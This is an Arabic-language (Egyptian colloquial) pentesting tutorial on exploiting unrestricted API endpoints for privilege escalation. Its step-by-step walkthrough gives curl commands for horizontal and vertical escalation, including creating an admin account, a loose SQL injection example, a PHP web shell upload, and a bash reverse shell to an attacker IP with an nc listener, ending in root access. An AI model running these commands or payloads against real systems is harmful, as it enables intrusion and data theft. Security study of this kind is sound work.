# **1. إيه هو Unrestricted API Endpoints Leading to Privilege Escalation؟**

## **الشرح العميق:**
"Unrestricted API Endpoints" يعني إن نقاط النهاية (Endpoints) في واجهة برمجة التطبيقات (API) بتاعة موقع أو تطبيق مفتوحة بدون قيود كافية، يعني أي حد يقدر يستخدمها من غير ما يتأكد من صلاحياته. الـ API هو اللي بيخلّي التطبيق يتواصل مع السيرفر (زي طلب بيانات أو تعديل حاجة)، ولما تكون "Unrestricted"، المستخدم العادي يقدر يوصل لصلاحيات أعلى (Privilege Escalation) سواء أفقي (Horizontal) أو عمودي (Vertical). ده بيحصل لما:
- مافيش تحقق من هوية المستخدم أو دوره (Role).
- الـ Endpoint بيسمح بتعديل بيانات أو تنفيذ أوامر المفروض تكون للأدمن بس.
- سوء تصميم أو إعدادات ضعيفة.

## **الأدوات والأوامر العملية:**
### 1. **فحص الـ API يدويًا:**
   - لو لقيت طلب زي: `GET http://target.com/api/users/123`.
   - جرب: `GET http://target.com/api/users/1` -> لو جاب بيانات الأدمن، يبقى unrestricted.

### 2. **اختبار بـ curl:**
   - `curl -X GET http://target.com/api/admin/settings -H "Authorization: Bearer <user_token>"`.
   - لو رجع بيانات لمستخدم عادي، يبقى مفتوح.

### 3. **استخدام Burp Suite:**
   - Intercept طلبات الـ API -> جرب تغير الـ Endpoint من `/api/user` لـ `/api/admin`.

## **خلاصة بالعامية المصرية:**
"يعني زي ما تكون حاطط كشك في الشارع بيبيع حاجات VIP، بس أي حد يقدر يخش ياخد من غير ما حد يسأله! Unrestricted API يعني الباب مفتوح للكل يلعب ويطلع الكبير."

---

# **2. ليه المشكلة دي خطيرة؟**

## **الشرح العميق:**
الـ Endpoints المفتوحة دي خطيرة لأنها بتدي المهاجم وصول لأماكن أو صلاحيات المفروض تكون مقفولة، وده بيؤدي ل:
- **تصعيد أفقي:** مستخدم عادي يشوف أو يعدل بيانات مستخدم تاني.
- **تصعيد عمودي:** يوصل لصلاحيات Admin أو يتحكم في النظام كله.
- **سرقة بيانات:** ياخد معلومات حساسة زي كلمات سر أو بيانات عملاء.
- **تنفيذ أوامر:** لو الـ Endpoint بيسمح، يقدر يرفع Shell أو يخرب النظام.

في الـ Pentesting، الثغرة دي كنز لأنها بتخليك تتحرك بحرية وتصعد صلاحياتك بسهولة لو لقيت Endpoint ضعيف.

## **الأدوات والأوامر العملية:**
### 1. **استغلال تصعيد أفقي:**
   - `curl -X GET http://target.com/api/users/999 -H "Cookie: session=<user_session>"`.
   - لو جاب بيانات مستخدم تاني، يبقى مفتوح.

### 2. **استغلال تصعيد عمودي:**
   - `curl -X POST http://target.com/api/admin/users -d '{"username":"hacker","role":"admin"}' -H "Cookie: session=<user_session>"`.
   - لو أضاف حساب Admin، يبقى unrestricted.

### 3. **SQL Injection في API:**
   - `curl -X GET "http://target.com/api/user?id=1; SELECT * FROM users --"`.
   - لو جاب بيانات زيادة، يبقى مكشوف.

## **خلاصة بالعامية المصرية:**
"المشكلة خطيرة لأنها زي ما تكون سايب مكتب المدير مفتوح وأي حد يقدر يخش يتحكم! المهاجم يلاقي الـ API مفتوح، يبقى الباشا بتاع الموقع على طول."

---

# **3. إزاي نستغلها في الـ Pentesting؟**
- **الهدف:** تستخدم الـ Endpoints المفتوحة عشان تتجاوز القيود، تسرق بيانات، أو تصعد صلاحياتك للتحكم الكامل.
- **مثال واقعي:** لو لقيت Endpoint بيسمح لمستخدم عادي يضيف Admin، تستخدمه عشان تبقى الكبير.

## **خلاصة بالعامية المصرية:**
"لما تلاقي الـ API مفتوح، زي ما تكون لقيت كنز في لعبة، تستخدمه عشان تكسب وتبقى الكبير بتاع الماتش من غير تعب!"

---

# **خطوات عملية للاستغلال في Pentesting**

## **الخطوة 1: فحص الهدف**
- شغل Nmap:
  - `nmap -sV 192.168.1.10`.
- افترض النتيجة:
  - Port 80: Apache 2.4.29.

## **الخطوة 2: اكتشاف الـ API**
- ابحث عن الـ API:
  - `curl -I http://192.168.1.10/api/` -> لو `200 OK`، يبقى موجود.
- بـ Gobuster:
  - `gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirb/common.txt -x php,json` -> ابحث عن `/api`.

## **الخطوة 3: اختبار الـ Endpoints**
- لو لقيت حساب User:
  - خد الـ Session Token من Cookie أو Header.
- جرب Endpoints:
  - `curl -X GET http://192.168.1.10/api/users/1 -H "Authorization: Bearer <user_token>"`.
  - لو جاب بيانات الأدمن، يبقى unrestricted.

## **الخطوة 4: استغلال أفقي**
- `curl -X GET http://192.168.1.10/api/users/999 -H "Authorization: Bearer <user_token>"`.
- لو جاب بيانات مستخدم تاني، سجلها (زي كلمة سر).

## **الخطوة 5: استغلال عمودي**
- جرب تعديل صلاحيات:
  - `curl -X POST http://192.168.1.10/api/users -d '{"id":1,"role":"admin"}' -H "Authorization: Bearer <user_token>"`.
  - لو نجح، سجل دخول كـ Admin.
- لو فيه Upload:
  - `curl -X POST http://192.168.1.10/api/upload -F "file=@shell.php" -H "Authorization: Bearer <user_token>"`.
  - `shell.php`: `<?php system($_GET['cmd']); ?>`.
  - افتح: `http://192.168.1.10/uploads/shell.php?cmd=id` -> `www-data`.

## **الخطوة 6: تصعيد الصلاحيات**
- من الـ Shell:
  - `http://192.168.1.10/uploads/shell.php?cmd=/bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1`.
  - `nc -lvnp 4444` -> Shell.
  - `id` -> `www-data` -> `sudo -l` -> لو لقيت `sudo /bin/bash`، نفذه -> `root`.

## **الخطوة 7: توثيق**
- سجل الـ Endpoints اللي لقيتها مفتوحة (زي `/api/users`).
- قدم تقرير يوضح إزاي الـ API فتح الباب للتصعيد.

## **خلاصة بالعامية المصرية:**
"الخطوات دي زي ما تكون لقيت كشك مفتوح في الشارع، خدت منه كل حاجة، وطلعت الكبير بتاع الحتة! الـ API لما يكون مفتوح، يبقى طريقك للفوز بسهولة."

---

# **الخلاصة النهائية:**
Unrestricted API Endpoints هي ثغرة كبيرة لأنها بتخلّي أي مستخدم يوصل لصلاحيات أعلى من غير قيود. في الـ Pentesting، دور عليها بـ curl أو Burp، استغلها عشان تسرق بيانات، تضيف صلاحيات، أو تاخد Shell، ووري العميل إن نظامه زي بيت مفتوح للكل! بالطريقة دي، تبقى البطل بتاع اللعبة بكل سهولة!